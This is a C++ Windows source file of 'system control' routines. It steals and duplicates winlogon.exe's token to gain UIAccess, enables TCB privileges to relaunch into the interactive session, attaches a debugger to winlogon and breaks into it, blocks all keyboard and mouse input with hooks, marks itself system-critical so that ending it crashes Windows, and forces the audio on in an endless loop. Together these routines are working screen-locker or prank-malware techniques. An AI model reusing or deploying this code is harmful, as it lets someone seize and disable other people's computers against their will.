#include "SysControl.h"
#include "EZError.h"
#include "EZAudioClient.h"
#include <tlhelp32.h>
#include <thread>

void AdjustPrivilege(LPCWSTR privilege, BOOL enabled)
{
	LUID luid;
	if (!LookupPrivilegeValue(NULL, privilege, &luid))
	{
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = 0;
	if (enabled) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}

	HANDLE currentToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentToken)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	if (!AdjustTokenPrivileges(currentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	// Required secondarry check because AdjustTokenPrivileges returns successful if some but not all permissions were adjusted.
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	if (!CloseHandle(currentToken)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
}

DWORD GetWinLogonPID() {
	// Create a snapshot.
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	// Search through running processes using the snapshot.
	if (!Process32First(snapshot, &processEntry)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	do {
		// If the current process is winlogon.exe return its PID.
		if (lstrcmpW(processEntry.szExeFile, L"winlogon.exe") == 0) {
			DWORD winlogonPID = processEntry.th32ProcessID;
			if (!CloseHandle(snapshot)) {
				EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
			}
			return winlogonPID;
		}
	} while (Process32Next(snapshot, &processEntry));

	// Cleanup and throw an error because winlogon.exe could not be found.
	if (!CloseHandle(snapshot)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	throw EZ::Error("WinLogon.exe could not be found in the list of running processes.", __FILE__, __LINE__);
}

BOOL IsAdmin() {
	// Open the current process token.
	HANDLE token;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &token)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Check if the current process token has UI Access already.
	_TOKEN_ELEVATION tokenElevation = { };
	DWORD returnLength = 0;
	if (!GetTokenInformation(token, TokenElevation, &tokenElevation, sizeof(DWORD), &returnLength)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Close the handle to the current process token we opened earlier.
	if (!CloseHandle(token)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// tokenInformation is set by GetTokenInformation to 1 if UIAccess is granted otherwise it is 0.
	return tokenElevation.TokenIsElevated != 0;
}
void RelaunchAsAdmin() {
	// Get the path to the current exe
	TCHAR szPath[MAX_PATH];
	if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)) == 0) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Create a shell execute info to launch the current exe with a UAC prompt.
	SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
	sei.lpVerb = L"runas";
	sei.lpFile = szPath;

	// Launch the shell execute info with the shell.
	if (!ShellExecuteEx(&sei)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
}

BOOL HasUIAccess() {
	// Open the current process token.
	HANDLE token;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Check if the current process token has UI Access already.
	DWORD tokenUIAccess = 0;
	DWORD returnLength = 0;
	if (!GetTokenInformation(token, TokenUIAccess, &tokenUIAccess, sizeof(DWORD), &returnLength)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Close the handle to the current process token we opened earlier.
	if (!CloseHandle(token)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// tokenInformation is set by GetTokenInformation to 1 if UIAccess is granted otherwise it is 0.
	return tokenUIAccess != 0;
}
HANDLE CreateUIAccessToken() {
	// Open the current process token.
	HANDLE currentToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentToken)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Get the process ID of winlogon.
	DWORD winlogonPID = GetWinLogonPID();

	// Open a handle to the winlogon process.
	HANDLE winlogon = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, winlogonPID);
	if (winlogon == INVALID_HANDLE_VALUE) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Get the winlogon process token.
	HANDLE winlogonToken;
	if (!OpenProcessToken(winlogon, TOKEN_DUPLICATE, &winlogonToken)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Duplicate the winlogon process token so we can use it.
	HANDLE winlogonTokenCopy;
	if (!DuplicateTokenEx(winlogonToken, TOKEN_IMPERSONATE, NULL, SecurityImpersonation, TokenImpersonation, &winlogonTokenCopy)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Set the token of the current thread to that one we just stole from winlogon.
	if (!SetThreadToken(NULL, winlogonTokenCopy)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Duplicate the current token.
	HANDLE currentTokenCopy;
	if (!DuplicateTokenEx(currentToken, TOKEN_ALL_ACCESS, NULL, SecurityAnonymous, TokenPrimary, &currentTokenCopy)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Give UIAccess to the copy of the current token we just made.
	BOOL uiAccess = TRUE;
	if (!SetTokenInformation(currentTokenCopy, TokenUIAccess, &uiAccess, sizeof(uiAccess))) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Set the token of the current thread back to the original token.
	if (!SetThreadToken(NULL, NULL)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	//Return and cleanup
	if (!CloseHandle(currentToken)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	if (!CloseHandle(winlogon)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	if (!CloseHandle(winlogonToken)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	if (!CloseHandle(winlogonTokenCopy)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	return currentTokenCopy;
}
void RelaunchWithUIAccess() {
	// Get a token with UIAccess
	HANDLE uiAccessToken = CreateUIAccessToken();

	// Launch the current process again with the new token.
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	GetStartupInfo(&si);
	if (!CreateProcessAsUser(uiAccessToken, NULL, GetCommandLine(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Cleanup and return
	if (!CloseHandle(uiAccessToken)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	if (!CloseHandle(pi.hProcess)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	if (!CloseHandle(pi.hThread)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
}

BOOL IsInteractive() {
	// Open the current process token.
	HANDLE token;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	DWORD activeConsoleSessionId = WTSGetActiveConsoleSessionId();
	if (activeConsoleSessionId == 0xFFFFFFFF) {
		throw EZ::Error("The current session is not interactive because there is no active session currently.", __FILE__, __LINE__);
	}

	DWORD sessionId = 0;
	DWORD returnLength = 0;
	if (!GetTokenInformation(token, TokenSessionId, &sessionId, sizeof(sessionId), &returnLength)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	if (!CloseHandle(token)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	return (sessionId == activeConsoleSessionId);
}
HANDLE CreateInteractiveToken() {
	// Give the current process the "Assign primary tokens" permission.
	AdjustPrivilege(SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);

	// Give current process the "Act as part of the operating system" permission.
	AdjustPrivilege(SE_TCB_NAME, TRUE);

	// Open the current process token.
	HANDLE currentToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentToken)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Duplicate the current process token.
	HANDLE currentTokenCopy;
	if (!DuplicateTokenEx(currentToken, TOKEN_ALL_ACCESS, NULL, SecurityIdentification, TokenPrimary, &currentTokenCopy)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Get current session id.
	DWORD activeConsoleSessionId = WTSGetActiveConsoleSessionId();
	if (activeConsoleSessionId == 0xFFFFFFFF) {
		throw EZ::Error("Could not create an interactive token because there is no active session currently.", __FILE__, __LINE__);
	}

	// Change the session ID of the current process token copy to the current session ID.
	if (!SetTokenInformation(currentTokenCopy, TokenSessionId, &activeConsoleSessionId, sizeof(activeConsoleSessionId))) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Cleanup, revoke permissions, and return
	AdjustPrivilege(SE_ASSIGNPRIMARYTOKEN_NAME, FALSE);
	AdjustPrivilege(SE_TCB_NAME, FALSE);
	if (!CloseHandle(currentToken)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	return currentTokenCopy;
}
void RestartInteractively() {
	// Get an interactive copy of the current token.
	HANDLE uiAccessToken = CreateInteractiveToken();

	// Launch the current process again with the new token.
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	GetStartupInfo(&si);
	if (!CreateProcessAsUser(uiAccessToken, NULL, GetCommandLine(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Cleanup and return
	if (!CloseHandle(uiAccessToken)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	if (!CloseHandle(pi.hProcess)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	if (!CloseHandle(pi.hThread)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
}

void BreakWinlogon() {
	// Take SE_DEBUG_PERMISSION
	AdjustPrivilege(SE_DEBUG_NAME, TRUE);

	// Get winlogon PID
	DWORD winlogonPID = GetWinLogonPID();

	// Attach debugger to winlogon
	if (!DebugActiveProcess(winlogonPID)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Open process handle to winlogon
	HANDLE winlogonHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_SUSPEND_RESUME, FALSE, winlogonPID);
	if (winlogonHandle == INVALID_HANDLE_VALUE) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Break winlogon
	if (!DebugBreakProcess(winlogonHandle)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
}

LRESULT CALLBACK BlockingHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	return 1; // Returning 1 indicates the event has been handled and should not be sent to any other handlers.
}
void BlockInput()
{
	BOOL hookInitialized = FALSE;
	std::thread windowThread([&hookInitialized]() {
		try {
			// Set up the low level keyboard and mouse hooks to disable those devices.
			HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, BlockingHookProc, NULL, NULL);
			if (keyboardHook == NULL) {
				EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
			}
			HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, BlockingHookProc, NULL, NULL);
			if (mouseHook == NULL) {
				EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
			}

			hookInitialized = TRUE;

			MSG msg = { };
			while (GetMessage(&msg, NULL, 0, 0))
			{
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}
		catch (EZ::Error error) { error.Print(); std::exit(1); }
		});
	windowThread.detach();

	while (!hookInitialized) { }
}

typedef long (WINAPI* SetProcessIsCritical) (
	IN BOOLEAN    bNew, // new setting for process
	OUT BOOLEAN* pbOld, // pointer which receives old setting (can be null)
	IN BOOLEAN    bNeedScb); // need system critical breaks
void MakeSystemCritical()
{
	// Take SE_DEBUG_PERMISSION
	AdjustPrivilege(SE_DEBUG_NAME, TRUE);

	// Load ntdll.dll
	HMODULE ntdll = LoadLibrary(L"ntdll.dll");
	if (ntdll == NULL) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Bind SetCriticalProcess to the RtlSetProcessIsCritical function in ntdll.dll.
	SetProcessIsCritical setCriticalProcess = reinterpret_cast<SetProcessIsCritical>(GetProcAddress(ntdll, "RtlSetProcessIsCritical"));
	if (setCriticalProcess == NULL) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Call the SetCriticalProcess function with TRUE to make the current process system critical.
	setCriticalProcess(TRUE, NULL, FALSE);

	// Revoke the SE_DEBUG_PERMISSION as it is no longer needed.
	AdjustPrivilege(SE_DEBUG_NAME, FALSE);
}

void LockMaxVolume() {
	std::thread volumeLockThread([]() {
		try {
			while (true) {
				EZ::AudioClient::SetVolume(0.25f);
				EZ::AudioClient::SetMute(FALSE);
			}
		}
		catch (EZ::Error error) { error.Print(); std::exit(1); }
		});
	volumeLockThread.detach();
}